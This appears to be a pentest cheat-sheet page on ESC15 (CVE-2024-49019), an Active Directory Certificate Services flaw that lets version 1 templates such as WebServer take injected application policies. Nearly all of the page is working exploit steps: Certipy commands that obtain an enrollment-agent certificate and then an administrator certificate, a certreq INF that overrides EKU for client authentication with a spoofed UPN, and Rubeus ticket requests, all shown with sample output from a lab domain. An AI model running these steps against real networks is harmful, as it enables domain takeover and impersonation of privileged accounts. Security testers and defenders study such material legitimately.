title: ESC15: Version 1 Template Application Policies (CVE-2024-49019)
html:
CVE-2024-49019 — Version 1 certificate templates where the enrollee can supply the subject allow injecting Application Policy OIDs that override EKU, enabling certificate request agent or client auth capabilities from non-auth templates like WebServer.

Warning

Patched November 12, 2024 (KB5014754). Discovered by Justin Bollinger (TrustedSec). Vulnerable default v1 templates: WebServer, ExchangeUser, CEPEncryption, SubCA, CA, EnrollmentAgentOffline.

Method 1 — Certipy Two-Step (Certificate Request Agent)

# Step 1: Get Certificate Request Agent capability
certipy req -u <username>@<domain> -p <password> --application-policies "1.3.6.1.4.1.311.20.2.1" -ca <ca-name> -template WebServer -dc-ip <dc-ip> -target <ca-host>
certipy req -u missandei@essos.local -p fr3edom \
    --application-policies "1.3.6.1.4.1.311.20.2.1" \
    -ca ESSOS-CA -template WebServer -dc-ip 192.168.56.12 -target braavos.essos.local

[*] Template : WebServer (vulnerable version 1)
[*] Application Policy : Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)
[*] CA Response : The certificate has been issued.
[*] Request ID  : 19
# Step 2: Request admin cert on-behalf-of
certipy req -u <username>@<domain> -on-behalf-of <domain>\\<target-user> -template User -ca <ca-name> -pfx <username>.pfx -dc-ip <dc-ip> -target <ca-host>
certipy req -u missandei@essos.local -on-behalf-of essos\administrator \
    -template User -ca ESSOS-CA -pfx missandei.pfx -dc-ip 192.168.56.12 -target braavos.essos.local

[*] On behalf of : essos\administrator
[*] CA Response  : The certificate has been issued.
[*] Request ID   : 20
# Step 3: Authenticate
certipy auth -pfx <target-user>.pfx -dc-ip <dc-ip>

Method 2 — certreq INF (Client Authentication Override)

[NewRequest]
Subject = "CN=<username>,CN=Users,DC=<domain>,DC=local"
KeyLength = 2048
CertificateTemplate = WebServer

[Extensions]
1.3.6.1.4.1.311.21.10 = "{text}1.3.6.1.5.5.7.3.2"
2.5.29.17 = "{text}upn=<target-user>@<domain>"
certreq -new -f esc15.inf esc15.req
certreq -submit -config "<ca-host>\<ca-name>" esc15.req
certreq -retrieve <request-id> esc15.cer

Verify Certificate Application Policy Override

certutil -dump esc15.cer | findstr -i "application\|enhanced"
certutil -dump esc15.cer | findstr -i "application\|enhanced"

Application Policies:
    [1] Policy Identifier=Client Authentication

Enhanced Key Usage:
    Server Authentication (1.3.6.1.5.5.7.3.1)

# Application Policy OVERRIDES EKU — certificate is now valid for client auth!
Rubeus.exe asktgt /user:<target-user> /certificate:<target-user>.pfx /password:mimikatz
excerpt: CVE-2024-49019 — Version 1 certificate templates where the enrollee can supply the subject allow injecting Application Policy OIDs that override EKU, enabling certificate request agent or client auth
